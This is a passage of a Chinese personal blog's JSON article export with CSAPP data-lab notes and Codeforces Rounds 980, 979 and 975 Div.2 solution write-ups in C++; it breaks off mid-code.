(1<<31);\n\t\telse return (~m)+1;\n\t}else{\n\t\tif(m>=0x80000000u) return 0x80000000u;\n\t\telse return m;\n\t}\n}\n```\n\n### floatPower2\n\n```cpp\n/*\n * floatPower2 - Return bit-level equivalent of the expression 2.0^x\n *   (2.0 raised to the power x) for any 32-bit integer x.\n *\n *   The unsigned value that is returned should have the identical bit\n *   representation as the single-precision floating-point number 2.0^x.\n *   If the result is too small to be represented as a denorm, return\n *   0. If too large, return +INF.\n *\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatPower2(int x) {\n    if(x<-149) return 0;\n\tif(x>127) return 0x7f800000u;\n\tif(x<-126){\n\t\tint d=-x-126;\n\t\treturn 1<<(23-d);\n\t}else{\n\t\tint d=x+127;\n\t\treturn d<<23;\n\t}\n}\n```\n\n","summary":"CSAPP 第二章 - 信息的表示和处理的读书笔记","key":["csapp","data lab","二进制","整数","浮点数"],"tags":[],"path":["os","csapp","CSAPP第二章 - 信息的表示和处理.md"],"background":"http://pic.caiwen.work/i/2025/01/29/6799cdcfd9014.png","recommend":false,"status":"published"},{"type":"Article","title":"Codeforces Round 980 Div.2","id":"cf980-2","createTime":"2024-10-25T14:47:00.000Z","updateTime":"2025-09-05T13:34:06.202Z","content":"\n正常发挥，上大分了。\n\n## CF2024A\n\n主观难度：入门\n\n标签：无\n\n小学应用题，直接列不等式解出来即可。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n    int a,b;cin>>a>>b;\n    if(a>=b) cout<<a<<endl;\n    else{\n        int x=b-a;\n        cout<<max(a-x,(int)0)<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2024B\n\n主观难度：普及-\n\n标签：排序、贪心\n\n把含有的量从小到大排序。考虑一个贪心策略，我们其实是希望尽量地少出现，按下去发现不出饮料，这种情况。排序后，比如当前最小值为 $a$ ，于是我们可以轮流按下每个机器，重复 $a$ 轮，直到把含量最小的那个机器耗光了。这时我们其实不知道哪个机器空了，题目要求我们求最坏情况，所以我们不得不按下为空的那个机器，同时这个机器后面也不会再按下了，我们知道他已经空了。于是对于剩余 $n-1$ 个机器，要处理的问题等价于原问题。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 200005\nint in[_];\ninline void subtask(){\n    int n,k;cin>>n>>k;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    sort(in+1,in+n+1);\n    int ans=0,base=0;\n    for(int i=1;i<=n;i++){\n        int now=in[i]-base;\n        if(now==0){\n            ans++;\n            continue;\n        }\n        int cnt=n-i+1;\n        if(now*cnt>=k){\n            ans+=k;\n            break;\n        }else{\n            ans+=now*cnt;\n            k-=now*cnt;\n            base=in[i];\n            ans++;\n        }\n    }\n    cout<<ans<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2024C\n\n主观难度：普及/提高-\n\n标签：贪心、排序\n\n经典贪心。考虑调整两个相邻的pair。调整相邻的pair并不会导致其他的pair对最终答案的贡献发生变化，只会更改被调整的两个pair的贡献。\n\n于是枚举 $4$ 的排列，考虑所有两个pair的四个数的相对大小关系下，这两个pair哪个放前面产生的逆序对最少。\n\n赛时我就怎么做的，不过实际上枚举了几个大小关系就猜出来了：把两个数中最小值最小的那个pair放前面是更优的。写完交上去直接wa了...然后立马考虑到如果最小值相同，应该把最大值最小的放前面。再交上去就ac了。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 100005\npii a[_];\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>a[i].first>>a[i].second;\n    sort(a+1,a+n+1,[](pii x,pii y){\n        int xmin=min(x.first,x.second);\n        int ymin=min(y.first,y.second);\n        if(xmin!=ymin) return xmin<ymin;\n        else{\n            xmin=x.first+x.second-xmin;\n            ymin=y.first+y.second-ymin;\n            return xmin<ymin;\n        }\n    });\n    for(int i=1;i<=n;i++) cout<<a[i].first<<' '<<a[i].second<<' ';\n    cout<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2024D\n\n主观难度：普及+/提高\n\n标签：线段树、dp、贪心、最短路\n\n首先一点，如果从当前点跳出去，到达的点在当前点前面，那么肯定是不跳的。因为我们直接从当前点开始一直往前走获得的分数是更优的。\n\n我们一顿跳，但最终还是要往前走，直到走到最前面的点。然后我直觉上感觉需要考虑一个 $dp[x]$ 表示从 $x$ 跳出去之后再回到 $x$ 能够获得的最大分数。\n\n假设从 $x$ 跳走，到达了点 $to$。然后我们这里又有了一点，从 $to$ 回到 $x$ 的过程中，最多再从一个点跳出去一次。因为如果两个点都跳了，那么我们相当与是损失了两个点的分数，而两次新获得的点（不在 $x$ 和 $to$ 之间的点）是有重叠的，最远的那次跳跃就能得到这些新点。于是我们考虑，比如我们中间再选择从点 $y$ 跳出去，那么最终 $dp[x]=a[x+1]+a[x+2]+...+a[y-1]+dp[y]$。考虑使用前缀和，得到 $dp[x]=dp[y]+pre[y-1]-pre[x]$。$dp[y]+pre[y-1]$ 可以直接丢到线段树中去维护。\n\n赛后和 lh 讨论时得知了另一种更好的做法：$x$ 与 $x$ 跳出到达的点 $y$ 之间连一个边权为 $a[x]$ 的有向边，点 $x$ 与点 $x-1$ 连一个边权为 $0$ 的有向边，然后跑最短路。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 400005\nint tree[_<<4],a[_],b[_],dp[_],pre[_];\nvoid modify(int k,int l,int r,int x,int y){\n    if(l==r) return tree[k]=y,void();\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y);\n    else modify(rs(k),mid+1,r,x,y);\n    tree[k]=max(tree[ls(k)],tree[rs(k)]);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return tree[k];\n    int mid=(l+r)>>1,ans=-inf;\n    if(x<=mid) ans=max(ans,query(ls(k),l,mid,x,y));\n    if(y>=mid+1) ans=max(ans,query(rs(k),mid+1,r,x,y));\n    return ans;\n}\nvoid clean(int k,int l,int r){\n    if(l==r) return tree[k]=0,void();\n    int mid=(l+r)>>1;\n    clean(ls(k),l,mid);\n    clean(rs(k),mid+1,r);\n    tree[k]=0;\n}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>a[i];\n    for(int i=1;i<=n;i++) cin>>b[i];\n    for(int i=1;i<=n;i++) pre[i]=pre[i-1]+a[i];\n    int ans=a[1];\n    for(int i=n;i>=1;i--){\n        if(b[i]<=i){\n            dp[i]=0;\n            continue;\n        }\n        int to=b[i];\n        int tmp=pre[to]-pre[i];\n        tmp=max(tmp,query(1,1,n,i,to)-pre[i]);\n        dp[i]=tmp;\n        modify(1,1,n,i,dp[i]+pre[i-1]);\n    }\n    cout<<max(ans,dp[1])<<endl;\n    clean(1,1,n);\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2024E/CF2024F\n\n这场题目难度分布有点抽象了... E 都补不动。这两题以后有机会再补吧。\n\n","summary":"Codeforces Round 980 Div.2总结，A、B、C、D","key":["codeforces","cf","980","div2"],"tags":[{"value":"未补完","color":"error"}],"path":["算法竞赛","做题、VP","Codeforces","Codeforces Round 980 Div.2.md"],"background":"https://www.caiwen.work/wp-content/uploads/2024/10/未命名4-2.jpg","recommend":false,"status":"published"},{"type":"Article","title":"Codeforces Round 979 Div.2","id":"cf979-2","createTime":"2024-10-25T14:01:00.000Z","updateTime":"2025-09-05T13:34:06.186Z","content":"\n唐完了，只切了A和B，C读假，卡一个多小时，D还剩10min无力气写了...\n\n## CF2030A\n\n主观难度：普及-\n\n标签：贪心、排序\n\n首先一点是 $c_1=b_1$。$c_i$ 和 $b_i$ 分别为前缀最大值和前缀最小值。如果我们把最大的数放在最前面，那么所有的 $c_i$ 都会是最大的，对于 $b_i$ 同理。所以我们考虑前两个数字放最大值和最小值，然后答案即为 $(maxx-minn)\\times i$。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n    int n;cin>>n;\n    int maxx=-inf,minn=inf;\n    for(int i=1;i<=n;i++){\n        int x;cin>>x;\n        maxx=max(maxx,x);\n        minn=min(minn,x);\n    }\n    cout<<(maxx-minn)*(n-1)<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2030B\n\n发现 $f(t)$ 和 $g(t)$ 都是能算出来的。具体地，$f(t)=2^{cnt_0}-1$，$g(t)=2^{cnt_1+cnt_0}-1-f(t)=2^{cnt_1+cnt_0}-2^{cnt_0}$。即为最小化 $|2^{cnt_1+cnt_0}-2^{cnt_0+1}+1|$。容易看出 $cnt_1+cnt_0=cnt_0+1$ 即 $cnt_1=1$ 时能取到最小值。\n\n那么构造方案就出来了，只输出 $1$ 个 `1`，剩余地方都是 `0` 即可。注意特判 $n=1$ 的情况。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n    int n;cin>>n;\n    if(n==1) cout<<\"0\"<<endl;\n    else if(n==2) cout<<\"01\"<<endl;\n    else if(n==3) cout<<\"010\"<<endl;\n    else{\n        for(int i=1;i<=n-1;i++) cout<<\"0\";\n        cout<<\"1\"<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2030C\n\n主观难度：普及-\n\n标签：博弈、贪心\n\n开始读错题了，以为填完运算符之后是从右到左进行计算得到的式子（至于为什么是从右到左而不是从左到右，因为我看样例都是这样），于是首先一个想法是贪心，Alice 肯定填 `or`，Bob 肯定填 `and`，搞完之后交上去发现WA了（题目都读错了肯定WA）。从直觉上看不出这个贪心有什么错误，但还是打算换个思路。之前遇到过博弈+dp的题目，于是考虑这个题是不是也是这样的。\n\n直接dp感觉有点难搞，因为当你决定当前这个运算符填还是不填的时候，当前要填的运算符的左侧是知道的，但右侧是不知道的，因为是从右往左计算。但右侧的结果要么是 $0$ 要么是 $1$。想了一会得到了这样的一个dp：$dp[i][0/1]$ 表示前 $i$ 个运算符确定，最后一个运算符右侧为 $0/1$ 时表达式最终结果。显然 $dp[i][0]=dp[i][1]$ 时就决出胜负了。没有决出胜负的话，Alice 的回合会考虑让最终表达式结果为 $1$，根据 $dp[i-1][0/1]$ 判断他希望这个运算符运算结果是 $0$ 还是 $1$。如果希望为 $0$ 的话他填 `and` 是比较好的，反之填 `or`。对于 Bob 同理。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint dp[200005][2];\ninline void subtask(){\n    int n;cin>>n;\n    string str;cin>>str;\n    if(str[0]=='1') cout<<\"YES\"<<endl;\n    else{\n        dp[1][0]=0;\n        dp[1][1]=1;\n        for(int i=2;i<=n-1;i++){\n            if(dp[i-1][0]==dp[i-1][1]){\n                if(dp[i-1][0]==1) cout<<\"YES\"<<endl;\n                else cout<<\"NO\"<<endl;\n                return;\n            }\n            if(i%2==1){//for a\n                int left=str[i-1]=='1'? 1:0;\n                if(dp[i-1][0]==1){\n                    dp[i][0]=1;\n                    dp[i][1]=left==1? 0:1;\n                }else{\n                    dp[i][0]=left==1? 1:0;\n                    dp[i][1]=1;\n                }\n            }else{//bob\n                int left=str[i-1]=='1'? 1:0;\n                if(dp[i-1][0]==0){\n                    dp[i][0]=0;\n                    dp[i][1]=left==1? 1:0;\n                }else{\n                    dp[i][0]=left==1? 0:1;\n                    dp[i][1]=0;\n                }\n            }\n        }\n        int right=str[n-1]=='0'? 0:1;\n        if(dp[n-1][right]) cout<<\"YES\"<<endl;\n        else cout<<\"NO\"<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n但说了这么多，还是把题目读假了，上述代码还是WA的。\n\n赛时检查这个dp检查了半天，觉得没毛病。后面感觉可能是最终表达式计算的那里读的不好（怎么可能会从右往左算，太离谱了）。最后卡到这个题了，临近比赛结束才从 lh 那里得知这道题是先把 `and` 都算完之后再算 `or`。\n\n这样的话，这个题就太简单了，首先首位都有 $1$ 的话是 Alice必胜的，Alice只需要把第一个和最后一个运算符选为 `or` 即可。如果有两个连续的 $1$，Alice也是必胜的，因为Alice可以在开始的三个回合内，把其中一个 `1` 的两边都加上 `or`，这样后续无论再怎么加都一定会让表达式为 `1`。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint dp[200005][2];\ninline void subtask(){\n    int n;cin>>n;\n    string str;cin>>str;\n    if(str[0]=='1'||str[n-1]=='1') cout<<\"YES\"<<endl;\n    else{\n        int las=1;\n        for(int i=0;i<n;i++){\n            int now=str[i]=='1'? 1:0;\n            if(now==1&&now==las) return cout<<\"YES\"<<endl,void();\n            las=now;\n        }\n        cout<<\"NO\"<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2030D\n\n主观难度：普及/提高-\n\n标签：差分\n\n发现如果能交换 $i$ 和 $i+1$ 位置，那么就给 $i$ 和 $i+1$ 连一个边。一个位置的数可以通过连上的边到达其他位置。因为我们要排序，所以算出每个数到排好序的位置要经过哪些边，从而得出哪些边是必选的。然后随着询问的进行，维护哪些边存在以及是否覆盖了必选边即可。使用差分即可做到。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint arr[200005],n,key[200005],now[200005];\nchar ch[200005];\ninline void subtask(){\n    int n,q;cin>>n>>q;\n    for(int i=1;i<=n;i++){\n        int x;cin>>x;\n        if(x==i) continue;\n        int l=min(x,i),r=max(x,i);\n        arr[l]++;arr[r]--;\n    }\n    for(int i=1;i<n;i++) key[i]=key[i-1]+arr[i];\n    cin>>ch+1;\n    int still=0;\n    for(int i=1;i<=n;i++){\n        if(ch[i]=='L') now[i-1]++;\n        else now[i]++;\n    }\n    for(int i=1;i<n;i++){\n        if(key[i]&&!now[i]) still++;\n        //debug(now[i]);\n    }\n    while(q--){\n        int x;cin>>x;\n        if(ch[x]=='L'){\n            now[x-1]--;\n            now[x]++;\n            if(now[x-1]==0&&key[x-1]) still++;\n            if(now[x]==1&&key[x]) still--;\n            ch[x]='R';\n        }else{\n            now[x]--;\n            now[x-1]++;\n            if(key[x]&&now[x]==0) still++;\n            if(key[x-1]&&now[x-1]==1) still--;\n            ch[x]='L';\n        }\n        if(still) cout<<\"NO\"<<endl;\n        else cout<<\"YES\"<<endl;\n    }\n    for(int i=1;i<=n;i++) arr[i]=key[i]=now[i]=0;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2030E\n\n主观难度：提高+/省选-\n\n标签：dp、组合数学、快速幂、贪心\n\n我们记 $f_i$ 为数字 $i$ 出现的次数。\n\n首先要看出一点，最终分数为 $f_0+min(f_0,f_1)+min(f_0,f_1,f_2)+...$。\n\n发现是加和的形式，我们可以考虑拆开看每一项对答案的贡献。\n\n比如考虑 $min(f_0,f_1,...f_i)$ 的贡献，记 $min(f_0,f_1,...f_i)=k$，这一项对答案的贡献即为能够使得 $min(f_0,f_1,...f_i)=k$ 的子序列的个数。显然 $min(f_0,f_1,...f_i)$ 只跟 $f_i$ 及之前 $f$ 的有关，$f_i$ 之后的无关。这就有了一个无后效性的特点，从而具有了 dp 的基础。\n\n设 $dp[i][j]$ 为仅考虑 $f_0$ 到 $f_i$，有 $min(f_0,f_1,...,f_i)=j$ 的子序列个数。那么对答案的贡献即为 $dp[i][j]\\times 2^{f_{i+1}+f_{i+2}+...+f_{n}}$。\n\n初始时有 $dp[0][i]=C_{f_0}^{i}$。\n\n考虑转移，$dp[i][j]$ 中的 $j$ 有两种可能，一种是前面 $i-1$ 项的最小值比 $j$ 大，是 $f_i$ 导致了前缀最小值为 $j$。另一种是前面 $i-1$ 项最小值为 $j$，$f_i$ 比 $j$ 大。于是就有\n\n$$\ndp[i][j]+=C_{f_i}^{j}\\times (dp[i-1][j]+dp[i-1][j+1]+dp[i-1][j+2]+...+dp[i-1][n])\n$$\n\n上述对应情况一。\n\n$$\ndp[i][j]+=dp[i-1][j]\\times (C_{f_i}^{j+1}+C_{f_i}^{j+2}+...+C_{f_i}^{f_i})\n$$\n\n上述对应情况二。\n\n显然我们可以使用前缀和进行优化，但最后总时间复杂度还是 $O(n^2)$ 的。\n\n不过我们需要发现一点，$dp[i][j]$ 中的 $j$ 最大值不会超过 $min(f_0,f_1,...,f_i)$ ，而我们知道所有 $f_i$ 相加才会是 $n$。所以，我们转移的时候控制一下枚举的上界，就能得到一个 $O(n)$ 的 dp。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=998244353;\ntypedef pair<int,int> pii;\n#define _ 200005\nint premin[_],a[_],fac[_],inv[_],f[_],pref[_];\nint dp[2][_],predp[_];\ninline int qpow(int x,int p,int res=1){for(;p;p>>=1,x=x*x%mod) if(p&1) res=res*x%mod;return res;}\ninline int c(int n,int m){return m>n? 0:fac[n]*inv[m]%mod*inv[n-m]%mod;}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>a[i];\n    for(int i=1;i<=n;i++) f[a[i]]++;\n    premin[0]=f[0];for(int i=1;i<=n;i++) premin[i]=min(premin[i-1],f[i]),pref[i]=(pref[i-1]+f[i])%mod;\n    int ans=0,now=0;\n    for(int i=1;i<=premin[0];i++) dp[1][i]=c(f[0],i),predp[i]=(predp[i-1]+dp[1][i])%mod,ans+=dp[1][i]*i%mod*qpow(2,pref[n])%mod,ans%=mod;\n    for(int i=1;i<=n;i++){\n        for(int j=1;j<=premin[i];j++) dp[now][j]=c(f[i],j)*((predp[premin[i-1]]-predp[j]+mod)%mod)%mod;\n        int suf=0;\n        for(int j=1;j<=f[i];j++) suf+=c(f[i],j),suf%=mod;\n        for(int j=1;j<=premin[i];j++) dp[now][j]+=dp[1-now][j]*suf%mod,dp[now][j]%=mod,suf=(suf-c(f[i],j)+mod)%mod;\n        for(int j=1;j<=premin[i];j++) predp[j]=(predp[j-1]+dp[now][j])%mod;\n        for(int j=1;j<=premin[i];j++) ans+=dp[now][j]*j%mod*qpow(2,pref[n]-pref[i])%mod,ans%=mod;\n        now=1-now;\n    }\n    cout<<ans<<endl;\n    for(int i=0;i<=n;i++) f[i]=0;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    fac[0]=1;\n    for(int i=1;i<=200000;i++) fac[i]=fac[i-1]*i%mod;\n    inv[200000]=qpow(fac[200000],mod-2);\n    for(int i=200000-1;i>=0;i--) inv[i]=inv[i+1]*(i+1)%mod;\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2030F\n\n主观难度：提高+/省选-\n\n标签：贪心、线段树、双指针\n\n首先你还是要看出一点（感觉cf很多题都需要你首先能看出什么性质来），如果询问区间出现类似 `a ... b ... a ... b` 这样的情况，即两个相同的数交叉，那么该区间肯定是消不掉的。\n\n于是我们的任务就是判断一个给定的区间是否包含这样的四个数。\n\n然后我们还需要看出一点，如果一个区间可以消掉，那么其包含的小区间也可以。这就意味着有单调的性质。我们不妨设 $far[x]$ 为以 $x$ 为左端点的区间中，最大的合法区间的右端点能到哪里。\n\n因为有单调的性质，于是我们就可以考虑使用双指针来快速地处理出 $far[x]$。处理出来后后续的询问就很好解决了。\n\n走双指针 $l$ 和 $r$，先固定 $l$ 表示正在求 $far[l]$，$r$ 不断尝试往前走。当 $r$ 扫到一个数字 $x$ 的时候，如果当前的 $x$ 的上一个 $x$ 出现的位置比 $l$ 还小，那么 $r$ 就可以往前移动。反之，$x$ 就可能是 `a ... b ... a ... b` 情况中的 `b`。于是我们在当前 $x$ 和 上个 $x$ 之间寻找是否有类似的 `a`。我们不妨把所有加入当前双指针区间的数字的上一个相同数字出现的位置加入线段树中维护，这样我们只需要在两个 $x$ 之间的区间内询问一个最小值，然后判断这个最小值是否比上一个 $x$ 还靠前就好了。值得注意的是，加入一个数字时如果上一个出现的位置比 $l$ 还小的话就不必加入到线段树了。$r$ 不断往前移动，再也移动不了了就计算出来了 $far[l]$ ，同时 $l$ 往前移动。$l$ 往前移动的时候，注意可能还需要在线段树中删掉一个元素。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 200005\nint in[_],lst[_],nxt[_],far[_],bu[_],tree[_<<4];\nvoid modify(int k,int l,int r,int x,int y){\n    if(l==r) return tree[k]=y,void();\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y);\n    else modify(rs(k),mid+1,r,x,y);\n    tree[k]=min(tree[ls(k)],tree[rs(k)]);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return tree[k];\n    int mid=(l+r)>>1,ans=inf;\n    if(x<=mid) ans=min(ans,query(ls(k),l,mid,x,y));\n    if(y>=mid+1) ans=min(ans,query(rs(k),mid+1,r,x,y));\n    return ans;\n}\nvoid build(int k,int l,int r){\n    if(l==r) return tree[k]=inf,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    tree[k]=inf;\n}\nbool flag=false;\ninline void subtask(){\n    int n,q;cin>>n>>q;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    for(int i=1;i<=n;i++) bu[i]=0;\n    for(int i=1;i<=n;i++) lst[i]=bu[in[i]],bu[in[i]]=i;\n    for(int i=1;i<=n;i++) bu[i]=inf;\n    for(int i=n;i>=1;i--) nxt[i]=bu[in[i]],bu[in[i]]=i;\n    build(1,1,n);\n    int l=1,r=1;\n    while(l<=n){//move l\n        while(r<n){//move r\n            if(lst[r+1]<l) r++;\n            else{\n                int ml=lst[r+1]+1,mr=r;\n                int t=query(1,1,n,ml,mr);\n                if(t>lst[r+1]){\n                    modify(1,1,n,r+1,lst[r+1]);\n                    r++;\n                }\n                else break;\n            }\n        }\n        far[l]=r;\n        if(nxt[l]<=r) modify(1,1,n,nxt[l],inf);\n        l++;\n    }\n    for(int i=1;i<=q;i++){\n        int ql,qr;cin>>ql>>qr;\n        if(qr>far[ql]) cout<<\"NO\"<<endl;\n        else cout<<\"YES\"<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    if(t==1) flag=true;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## CF2030G1/CF2030G2\n\n感觉不是自己能做出来的，先摆烂，有机会再补。\n\n","summary":"Codeforces Round 979 Div.2总结，A、B、C、D、E、F","key":["codeforces","cf","979","div2"],"tags":[{"value":"未补完","color":"error"}],"path":["算法竞赛","做题、VP","Codeforces","Codeforces Round 979 Div.2.md"],"background":"https://www.caiwen.work/wp-content/uploads/2024/10/未命名4-1-1.jpg","recommend":false,"status":"published"},{"type":"Article","title":"Codeforces Round 975 Div.2","id":"cf975-2","createTime":"2024-10-23T15:51:00.000Z","updateTime":"2025-09-05T13:34:06.165Z","content":"\n赛时切4个，再上大分\n\n## CF2019A\n\n主观难度：普及-\n\n标签：贪心\n\n显然总共有两种选法，一种是选所有偶数格子，一种是选所有奇数格子。这两种选法中一定存在一种选法可以把最大值选到。当总数为偶数时，两种选法能选到的格子数量相同，再选择能把最大值选到的选法就能得到最大答案。总数为奇数时，选所有奇数格子比选所有偶数格子能选到的格子数量多一个。如果选所有奇数格子能把最大值选到，那么就是最优的。反之，选所有偶数格子，虽然选到的格子数量少一个，但最大值比次大值至少大一，所以就把亏的部分补回来了。综上，把最大值选上是最优的。注意如果有多个最大值，显然选择位于奇数位置的最大值更好一些。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint in[101];\ninline void subtask(){\n\tint n;cin>>n;\n\tint maxx=-inf,index;\n\tfor(int i=1;i<=n;i++){\n\t\tint x;cin>>x;\n\t\tif(x>maxx){\n\t\t\tmaxx=x;\n\t\t\tindex=i;\n\t\t}else if(x==maxx){\n\t\t\tif(i%2){\n\t\t\t\tindex=i;\n\t\t\t}\n\t\t}\n\t}\n\tif(n%2==0){\n\t\tcout<<maxx+n/2<<endl;\n\t}else{\n\t\tif(index%2){\n\t\t\tcout<<maxx+n/2+1<<endl;\n\t\t}else{\n\t\t\tcout<<maxx+n/2<<endl;\n\t\t}\n\t}\n}\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint t;cin>>t;\n\twhile(t--) subtask();\n\treturn 0;\n}\n```\n\n## CF2019B\n\n主观难度：普及/提高-\n\n标签：map、组合计数\n\n容易发现，有很多点，被穿过线段数量是相同的。具体的，比如 $(x_i,x_{i+1})$ 区间内的点，被穿过线段数量是相同的（注意是开区间，端点处的情况我们再谨慎讨论），而且不难计算出数量为 $i\\times(n-i)$，共有 $x_{i+1}-x_i-1$ 个点。考虑到这样算出来的数量不多，所以开个map。对于这种情况，$mp[i\\times(n-i)]+=x_{i+1}-x_i-1$。然后考虑端点处，点 $x_i$ 被穿过线段数量为 $i\\times(n-i+1)-1$ （左边能选 $i$ 个点，右边能选 $n-i+1$ 个点（注意第 $i$ 个点，即区间左端点也能再选），但是这样的话会出现左右两边都选第 $i$ 个点的情况，所以再减一。这种情况下，$mp[i\\times(n-i+1)-1]++$。\n\n然后对于每个询问，直接从 map 取就好了。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\ninline void subtask(){\n\tint n,q;cin>>n>>q;\n\tunordered_map<int,int> mp;\n\tint las;\n\tfor(int i=1;i<=n;i++){\n\t\tint x;cin>>x;\n\t\tif(i==1||i==n){\n\t\t\tmp[n-1]=mp[n-1]+1;\n\t\t}else{\n\t\t\tint now=i*(n-i+1)-1;\n\t\t\tmp[now]=mp[now]+1;\n\t\t}\n\t\tif(i!=1){\n\t\t\tint l=i-1;\n\t\t\tint r=n-l;\n\t\t\tint now=l*r;\n\t\t\tmp[now]=mp[now]+x-las-1;\n\t\t}\n\t\tlas=x;\n\t}\n\tfor(int i=1;i<=q;i++){\n\t\tint 